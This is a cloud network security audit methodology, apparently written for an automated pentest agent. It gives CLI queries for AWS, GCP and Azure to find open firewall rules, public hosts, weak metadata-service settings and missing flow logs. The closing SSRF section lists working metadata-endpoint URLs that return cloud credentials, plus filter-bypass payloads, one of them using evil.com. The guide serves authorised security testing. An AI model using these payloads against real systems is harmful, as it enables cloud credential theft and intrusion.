# Cloud Network Security Methodology

Find exposed services, permissive firewall rules, metadata pivots, and SSRF-to-credential paths.

## Universal triage

1. **Perimeter inventory**: which resources have public IPs / DNS / load balancers?
2. **Ingress rules**: anything allowing `0.0.0.0/0` or provider-equivalents (`*`, `Internet`, `all`) to sensitive ports?
3. **Egress rules**: unrestricted egress enables exfiltration and C2.
4. **Metadata services**: IMDSv1/v2 posture on VMs that run user-influenced code (SSRF preconditions).
5. **Logging**: flow logs enabled and retained?
6. **Private connectivity**: are private endpoints used where possible (PrivateLink / Service Connect / Private Endpoint)?

## Sensitive ingress ports to flag

Always flag `0.0.0.0/0` → any of:
`22, 3389, 3306, 5432, 1433, 27017, 6379, 9200, 2375, 2376, 5984, 11211, 5900, 5901, 9000, 9001, 9092, 8086`

## AWS

```bash
# Security group rules from 0.0.0.0/0
aws ec2 describe-security-groups \
  --query "SecurityGroups[].{id:GroupId,name:GroupName,vpc:VpcId,rules:IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]}"

# Public EC2
aws ec2 describe-instances \
  --query "Reservations[].Instances[?PublicIpAddress!=null]"

# IMDSv1 still allowed?
aws ec2 describe-instances \
  --query "Reservations[].Instances[?MetadataOptions.HttpTokens=='optional'].InstanceId"

# ELBs without WAF
aws elbv2 describe-load-balancers --query "LoadBalancers[?Scheme=='internet-facing']"

# VPC flow logs
aws ec2 describe-flow-logs
aws ec2 describe-vpcs --query "Vpcs[].VpcId" | \
  while read v; do
    echo "$v:"
    aws ec2 describe-flow-logs --filter Name=resource-id,Values=$v
  done

# Default VPC still in use (bad for prod)
aws ec2 describe-vpcs --filters Name=isDefault,Values=true
```

### AWS pitfalls

- `PrefixList` referenced in SG rule that internally resolves to broad CIDR.
- NACLs denying, but SG allowing — NACL is stateless, easily bypassed by return traffic gaps.
- Security group referencing another SG that is itself overly permissive.
- VPC peering across untrusted accounts with route table exposure.
- `AmazonProvidedDNS` + split-horizon misconfigurations exposing internal names externally.

## GCP

```bash
# Firewall rules 0.0.0.0/0
gcloud compute firewall-rules list \
  --filter="direction=INGRESS AND sourceRanges.list():0.0.0.0/0" \
  --format="table(name,network,sourceRanges,allowed[].ports.flatten())"

# Default network still in use
gcloud compute networks list
gcloud compute firewall-rules list --filter="network:default"

# Instances with external IPs
gcloud compute instances list \
  --filter="networkInterfaces.accessConfigs.natIP:*" \
  --format="table(name,zone,networkInterfaces[0].accessConfigs[0].natIP)"

# VPC flow logs per subnet
gcloud compute networks subnets list \
  --format="table(name,region,enableFlowLogs)"

# Cloud Armor policies on LBs
gcloud compute security-policies list
```

### GCP pitfalls

- Default VPC has permissive firewall rules (`default-allow-ssh`, `default-allow-rdp`).
- `0.0.0.0/0` ingress with `protocols: all` permissions effectively disables firewall.
- IAP (Identity-Aware Proxy) not used for admin access to private instances.
- VPC peering without restricted route advertisement.

## Azure

```bash
# NSGs allowing broad ingress
az network nsg list -o table

az graph query -q "
  Resources
  | where type =~ 'microsoft.network/networksecuritygroups'
  | mv-expand rule = properties.securityRules
  | where rule.properties.access == 'Allow'
    and rule.properties.direction == 'Inbound'
    and rule.properties.sourceAddressPrefix in ('*','Internet','0.0.0.0/0')
  | project nsg=name, rule=rule.name,
            ports=rule.properties.destinationPortRange,
            src=rule.properties.sourceAddressPrefix
"

# Public IPs
az network public-ip list --query "[?ipAddress!=null]" -o table

# VMs with public IP and management port open
az network public-ip list --query "[?ipAddress!=null].{Name:name,IP:ipAddress,AttachedTo:ipConfiguration.id}"

# Flow logs per NSG
az network watcher flow-log list --location eastus
```

### Azure pitfalls

- Service tags `*`, `Internet`, `AzureCloud` are overly broad.
- Just-in-Time VM access disabled, direct RDP/SSH exposed.
- Azure Bastion not deployed; jump-host VMs with public IPs instead.
- Network Security Group assigned at NIC level overrides subnet-level NSG — check both.
- App Services / Functions with public access despite VNet integration.

## Metadata service posture

For each IaaS VM, confirm:

| Cloud | Posture required |
|-------|------------------|
| AWS   | IMDSv2 enforced (`HttpTokens=required`), hop limit = 1, IMDSv1 blocked |
| GCP   | Shielded VM on, metadata concealment where appropriate, default SA not used |
| Azure | `Metadata: true` header required (built-in); MI access scoped minimally |

If a VM runs user-influenced code (webhooks, LLM tools, etc.), tighten these. See `network_security.md` metadata exploitation below for SSRF payloads.

## SSRF → cloud credentials

When chained from an SSRF finding in an application-layer pentest:

```
# AWS (IMDSv1 only)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
http://169.254.169.254/latest/user-data/

# Azure (requires Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# GCP (requires Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Filter bypasses
http://[::ffff:169.254.169.254]/         # IPv6-mapped
http://169.254.169.254.nip.io/           # DNS-based
http://0xA9FEA9FE/                       # hex
http://2852039166/                       # decimal
http://169.254.169.254%23@evil.com/...   # URL parser confusion
```

## Reasoning budget

- **Rule enumeration**: minimal thinking — tool-driven.
- **Effective reachability analysis** (layered NACL + SG, peered VPCs, Transit Gateway): moderate to high thinking — requires graph reasoning.
- **SSRF chain construction**: moderate thinking — requires understanding upstream vulnerability.

## Parallelism

Regions / subscriptions / projects can be audited in parallel. IMDS posture checks fan out per VM.
